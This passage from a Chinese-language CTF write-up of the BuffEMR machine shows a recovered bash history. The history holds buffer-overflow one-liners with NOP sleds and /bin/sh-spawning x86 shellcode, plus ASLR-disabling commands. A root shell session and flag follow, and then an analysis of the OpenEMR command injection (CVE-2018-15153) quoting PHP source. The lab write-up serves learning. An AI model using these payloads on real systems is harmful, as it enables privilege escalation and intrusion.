len(&#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27;)&quot;</span></span><br><span class="line"><span class="string">python</span></span><br><span class="line"><span class="string">./dontexecute `python -c ‘print “\x90”*157 + “\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80” + “\x41\x41\x41\x41”’`</span></span><br><span class="line"><span class="string">./dontexecute `python -c ‘print “\x90”*157 + “\x31-c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;\x90&quot;</span>*157 + <span class="string">&quot;\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80” + “\x41\x41\x41\x41”’`</span></span><br><span class="line"><span class="string">./dontexecute `python -c ‘rint “\x90”*157 + “\x31-c &#x27;print &quot;</span>\x90<span class="string">&quot;*157 + &quot;</span>\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80” + “\x41\x41\x41\x41”’`</span><br><span class="line">gdb -q --args ./dontexecute `python -c ‘rint “\x90”*157 + “\x31-c <span class="string">&#x27;print &quot;\x90&quot;*157 + &quot;\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80” + “\x41\x41\x41\x41”’`</span></span><br><span class="line"><span class="string">gdb dontexecute </span></span><br><span class="line"><span class="string">./dontexecute </span></span><br><span class="line"><span class="string">gdb dontexecute </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">gdb danger</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">./danger </span></span><br><span class="line"><span class="string">./danger 11</span></span><br><span class="line"><span class="string">./danger 122</span></span><br><span class="line"><span class="string">./danger </span></span><br><span class="line"><span class="string">./danger hello</span></span><br><span class="line"><span class="string">gdb danger </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">rm danger </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">nano danger.cpp</span></span><br><span class="line"><span class="string">wget https://www.danielmills.org/downloads/buffer_overflow/escalate.cpp</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">mv escalate.cpp dontexecute.cpp</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">gcc danger.c -o danger -fno-stack-protector -g -z execstack</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">cd /opt/</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">./dontexecute $(python -c &quot;print &#x27;</span>\x90<span class="string">&#x27; * 457 + &#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27; + &#x27;</span>\xc0\xd5\xff\xff<span class="string">&#x27;&quot;)</span></span><br><span class="line"><span class="string">gdb dontexecute </span></span><br><span class="line"><span class="string">./dontexecute $(python -c &quot;print &#x27;</span>\x90<span class="string">&#x27; * 457 + &#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27; + &#x27;</span>\xf0\xd6\xff\xff<span class="string">&#x27;&quot;)</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;\x90&quot;</span> * 457 + <span class="string">&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;</span> + <span class="string">&quot;\xf0\xd6\xff\xff&quot;</span><span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb dontexecute </span></span><br><span class="line"><span class="string">https://github.com/san3ncrypt3d/shell-code-priv-esc</span></span><br><span class="line"><span class="string">./dontexecute $(python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;\x90&quot;</span> * 459 + <span class="string">&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;</span> + <span class="string">&quot;\xa0\xd6\xff\xff&quot;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">exit</span></span><br><span class="line"><span class="string">cd /opt/</span></span><br><span class="line"><span class="string">./dontexecute $(python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;\x90&quot;</span> * 459 + <span class="string">&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;</span> + <span class="string">&quot;\xa0\xd6\xff\xff&quot;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">cd /opt/</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">rm dontexecute.cpp </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">cat /proc/sys/kernel/randomize_va_space </span></span><br><span class="line"><span class="string">echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space </span></span><br><span class="line"><span class="string">sudo echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space </span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">cat /proc/sys/kernel/randomize_va_space </span></span><br><span class="line"><span class="string">nano /etc/sysctl.d/01-disable-aslr.conf</span></span><br><span class="line"><span class="string">sudo nano /etc/sysctl.d/01-disable-aslr.conf</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">cat /proc/sys/kernel/randomize_va_space </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>从命令执行记录推测 <code>./dontexecute</code>
可能存在缓冲区溢出漏洞，测试最后一条执行的命令发现可直接提权至 root</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">buffemr@buffemr:/opt$ ./dontexecute $(python -c <span class="string">&#x27;print &quot;\x90&quot; * 459 + &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot; + &quot;\xa0\xd6\xff\xff&quot;&#x27;</span>)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(buffemr) <span class="built_in">groups</span>=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line">root@buffemr:/opt<span class="comment"># cd ~</span></span><br><span class="line">root@buffemr:/root<span class="comment"># ls -al</span></span><br><span class="line">total 44</span><br><span class="line">drwx------  6 root root 4096 Jun 23  2021 .</span><br><span class="line">drwxr-xr-x 26 root root 4096 Jun 24  2021 ..</span><br><span class="line">-rw-------  1 root root 3474 Jun 24  2021 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Aug  6  2020 .cache</span><br><span class="line">drwx------  3 root root 4096 Jun 18  2021 .gnupg</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jun 18  2021 .<span class="built_in">local</span></span><br><span class="line">-rw-------  1 root root 1346 Jun 21  2021 .mysql_history</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root 4071 Jun 23  2021 Root_flag.txt</span><br><span class="line">drwxr-xr-x  6 root root 4096 Jun 18  2021 snap</span><br><span class="line">root@buffemr:/root<span class="comment"># cat Root_flag.txt </span></span><br><span class="line">                                                                                                                                          </span><br><span class="line">                                                                                                                                            </span><br><span class="line">________                __  __                       ____                                  _____                                        ___ </span><br><span class="line">`MMMMMMMb.             69MM69MM                     6MMMMb                                69M`MM                                        `MM </span><br><span class="line"> MM    `Mb            6M<span class="string">&#x27; 6M&#x27;</span> `                    8P    Y8                              6M<span class="string">&#x27; `MM                                         MM </span></span><br><span class="line"><span class="string"> MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM </span></span><br><span class="line"><span class="string"> MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M&#x27;</span> 6MMMMb `MM 6MM MMMMM MM  6MMMMMb `MM(   ,M.   )M<span class="string">&#x27; 6MMMMb   6MMMMMM </span></span><br><span class="line"><span class="string"> MMMMMMM(   MM    MM  MM  MM6M&#x27;</span>  `Mb MM69 <span class="string">&quot;       MM      MM  `Mb    d&#x27; 6M&#x27;  `Mb MM69 &quot;</span>  MM   MM 6M<span class="string">&#x27;   `Mb `Mb   dMb   d&#x27;</span> 6M<span class="string">&#x27;  `Mb 6M&#x27;</span>  `MM </span><br><span class="line"> MM    `Mb  MM    MM  MM  MMMM    MM MM<span class="string">&#x27;          MM      MM   YM.  ,P  MM    MM MM&#x27;</span>     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM </span><br><span class="line"> MM     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  `Mb d<span class="string">&#x27;`Mb d&#x27;</span>  MMMMMMMM MM    MM </span><br><span class="line"> MM     MM  MM    MM  MM  MMMM       MM           YM      M9    `Mbd<span class="string">&#x27;   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM </span></span><br><span class="line"><span class="string"> MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM&#x27;</span>  `MM<span class="string">&#x27;   YM    d9 YM.  ,MM </span></span><br><span class="line"><span class="string">_MMMMMMM9&#x27;</span>   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_</span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">                                                                                                                                            </span><br><span class="line">________                                           ___        8   8                                                                         </span><br><span class="line">`MMMMMMMb.                                         `MM       (M) (M)                                                                        </span><br><span class="line"> MM    `Mb                      /                   MM       (M) (M)                                                                        </span><br><span class="line"> MM     MM   _____     _____   /M      ____     ____MM       (M) (M)                                                                        </span><br><span class="line"> MM     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         </span><br><span class="line"> MM    .M9 6M<span class="string">&#x27;   `Mb 6M&#x27;</span>   `Mb MM    6M<span class="string">&#x27;  `Mb 6M&#x27;</span>  `MM        M   M                                                                         </span><br><span class="line"> MMMMMMM9<span class="string">&#x27; MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         </span></span><br><span class="line"><span class="string"> MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         </span></span><br><span class="line"><span class="string"> MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      </span></span><br><span class="line"><span class="string"> MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        </span></span><br><span class="line"><span class="string">_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">COngratulations !!! Tweet me at @san3ncrypt3d ! </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@buffemr:/root# </span></span><br></pre></td></tr></table></figure>
<p>获得 root 权限</p>
<p>进一步确认 dontexecute 有 SUID 权限，dontexecute 分析参见 3.2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@buffemr:/opt<span class="comment"># ls -al</span></span><br><span class="line">total 16</span><br><span class="line">drwxrwx---+  2 root root 4096 Jun 24  2021 .</span><br><span class="line">drwxr-xr-x  26 root root 4096 Jun 24  2021 ..</span><br><span class="line">-rwsrwxr-x   1 root root 7700 Jun 23  2021 dontexecute</span><br></pre></td></tr></table></figure>
<h2 id="复盘">3. 复盘</h2>
<h3 id="openemr-os-命令注入漏洞">3.1. OpenEMR OS 命令注入漏洞</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2018-15153">OpenEMR
OS命令注入漏洞（CVE-2018-15153，CNVD-2018-18133）</a></p>
</blockquote>
<h4 id="分析">3.1.1. 分析</h4>
<p>分析前面漏洞利用脚本 45161.py 知，漏洞点在于服务端的 edit_globals.php
在更新数据库数据未对输入的参数做检查，相关代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// If we are saving main globals.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;form_save&#x27;</span>, <span class="variable">$_POST</span>) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;form_save&#x27;</span>] &amp;&amp; !<span class="variable">$userMode</span>) &#123;</span><br><span class="line">    <span class="variable">$force_off_enable_auditlog_encryption</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// Need to force enable_auditlog_encryption off if the php openssl module</span></span><br><span class="line">  <span class="comment">// is not installed or the AES-256-CBC cipher is not available.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;AES-256-CBC&#x27;</span>, <span class="title function_ invoke__">openssl_get_cipher_methods</span>())) &#123;</span><br><span class="line">        <span class="variable">$force_off_enable_auditlog_encryption</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Aug 22, 2014: Ensoftek: For Auditable events and tamper-resistance (MU2)</span></span><br><span class="line">  <span class="comment">// Check the current status of Audit Logging</span></span><br><span class="line">    <span class="variable">$auditLogStatusFieldOld</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;enable_auditlog&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Compare form values with old database values.</span></span><br><span class="line"><span class="comment">   * Only save if values differ. Improves speed.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get all the globals from DB</span></span><br><span class="line">    <span class="variable">$old_globals</span> = <span class="title function_ invoke__">sqlGetAssoc</span>(<span class="string">&#x27;SELECT gl_name, gl_index, gl_value FROM `globals` ORDER BY gl_name, gl_index&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$GLOBALS_METADATA</span> <span class="keyword">as</span> <span class="variable">$grpname</span> =&gt; <span class="variable">$grparr</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$grparr</span> <span class="keyword">as</span> <span class="variable">$fldid</span> =&gt; <span class="variable">$fldarr</span>) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$fldname</span>, <span class="variable">$fldtype</span>, <span class="variable">$flddef</span>, <span class="variable">$flddesc</span>) = <span class="variable">$fldarr</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fldtype</span> == <span class="string">&#x27;pwd&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$pass</span> = <span class="title function_ invoke__">sqlQuery</span>(<span class="string">&quot;SELECT gl_value FROM globals WHERE gl_name = ?&quot;</span>, <span class="keyword">array</span>(<span class="variable">$fldid</span>));</span><br><span class="line">                <span class="variable">$fldvalueold</span> = <span class="variable">$pass</span>[<span class="string">&#x27;gl_value&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Multiple choice fields - do not compare , overwrite */</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$fldtype</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$fldtype</span>, <span class="number">0</span>, <span class="number">2</span>) == <span class="string">&#x27;m_&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;form_<span class="subst">$i</span>&quot;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$fldindex</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">sqlStatement</span>(<span class="string">&quot;DELETE FROM globals WHERE gl_name = ?&quot;</span>, <span class="keyword">array</span>( <span class="variable">$fldid</span> ));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_POST</span>[<span class="string">&quot;form_<span class="subst">$i</span>&quot;</span>] <span class="keyword">as</span> <span class="variable">$fldvalue</span>) &#123;</span><br><span class="line">                        <span class="variable">$fldvalue</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$fldvalue</span>);</span><br><span class="line">                        <span class="title function_ invoke__">sqlStatement</span>(<span class="string">&#x27;INSERT INTO `globals` ( gl_name, gl_index, gl_value ) VALUES ( ?,?,?)&#x27;</span>, <span class="keyword">array</span>( <span class="variable">$fldid</span>, <span class="variable">$fldindex</span>, <span class="variable">$fldvalue</span> ));</span><br><span class="line">                        ++<span class="variable">$fldindex</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* check value of single field. Don&#x27;t update if the database holds the same value */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;form_<span class="subst">$i</span>&quot;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$fldvalue</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&quot;form_<span class="subst">$i</span>&quot;</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$fldvalue</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$fldtype</span>==<span class="string">&#x27;pwd&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$fldvalue</span> = <span class="variable">$fldvalue</span> ? <span class="title function_ invoke__">SHA1</span>(<span class="variable">$fldvalue</span>) : <span class="variable">$fldvalueold</span>; <span class="comment">// <span class="doctag">TODO:</span> salted passwords?</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// We rely on the fact that set of keys in globals.inc === set of keys in `globals`  table!</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$old_globals</span>[<span class="variable">$fldid</span>]) <span class="comment">// if the key not found in database - update database</span></span><br><span class="line">                    ||</span><br><span class="line">                   ( <span class="keyword">isset</span>(<span class="variable">$old_globals</span>[<span class="variable">$fldid</span>]) &amp;&amp; <span class="variable">$old_globals</span>[ <span class="variable">$fldid</span> ][<span class="string">&#x27;gl_value&#x27;</span>] !== <span class="variable">$fldvalue</span> ) <span class="comment">// if the value in database is different</span></span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="comment">// Need to force enable_auditlog_encryption off if the php openssl module</span></span><br><span class="line">                    <span class="comment">// is not installed or the AES-256-CBC cipher is not available.</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$force_off_enable_auditlog_encryption</span> &amp;&amp; (<span class="variable">$fldid</span> == <span class="string">&quot;enable_auditlog_encryption&quot;</span>)) &#123;</span><br><span class="line">                        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;OPENEMR ERROR: UNABLE to support auditlog encryption since the php openssl module is not installed or the AES-256-CBC cipher is not available&quot;</span>, <span class="number">0</span>);</span><br><span class="line">                        <span class="variable">$fldvalue</span>=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$force_off_enable_auditlog_encryption</span> &amp;&amp; (<span class="variable">$fldid</span> == <span class="string">&quot;enable_auditlog_encryption&quot;</span>) &amp;&amp; (<span class="variable">$fldvalue</span>==<span class="number">1</span>)) &#123;</span><br><span class="line">                        <span class="comment">// Run below function to set up the encryption key</span></span><br><span class="line">                        <span class="title function_ invoke__">aes256PrepKey</span>();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">// special treatment for some vars</span></span><br><span class="line">                    <span class="keyword">switch</span> (<span class="variable">$fldid</span>) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;first_day_week&#x27;</span>:</span><br><span class="line">                            <span class="comment">// update PostCalendar config as well</span></span><br><span class="line">                            <span class="title function_ invoke__">sqlStatement</span>(<span class="string">&quot;UPDATE openemr_module_vars SET pn_value = ? WHERE pn_name = &#x27;pcFirstDayOfWeek&#x27;&quot;</span>, <span class="keyword">array</span>(<span class="variable">$fldvalue</span>));</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">// Replace old values</span></span><br><span class="line">                      <span class="title function_ invoke__">sqlStatement</span>(<span class="string">&#x27;DELETE FROM `globals` WHERE gl_name = ?&#x27;</span>, <span class="keyword">array</span>( <span class="variable">$fldid</span> ));</span><br><span class="line">                      <span class="title function_ invoke__">sqlStatement</span>(<span class="string">&#x27;INSERT INTO `globals` ( gl_name, gl_index, gl_value ) VALUES ( ?, ?, ? )&#x27;</span>, <span class="keyword">array</span>( <span class="variable">$fldid</span>, <span class="number">0</span>, <span class="variable">$fldvalue</span> ));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//error_log(&quot;No need to update $fldid&quot;);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++<span class="variable">$i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">checkCreateCDB</span>();</span><br><span class="line">    <span class="title function_ invoke__">checkBackgroundServices</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// July 1, 2014: Ensoftek: For Auditable events and tamper-resistance (MU2)</span></span><br><span class="line">  <span class="comment">// If Audit Logging status has changed, log it.</span></span><br><span class="line">    <span class="variable">$auditLogStatusNew</span> = <span class="title function_ invoke__">sqlQuery</span>(<span class="string">&quot;SELECT gl_value FROM globals WHERE gl_name = &#x27;enable_auditlog&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$auditLogStatusFieldNew</span> = <span class="variable">$auditLogStatusNew</span>[<span class="string">&#x27;gl_value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auditLogStatusFieldOld</span> != <span class="variable">$auditLogStatusFieldNew</span>) &#123;</span><br><span class="line">         <span class="title function_ invoke__">auditSQLAuditTamper</span>(<span class="variable">$auditLogStatusFieldNew</span>);</span><br><span class="line">    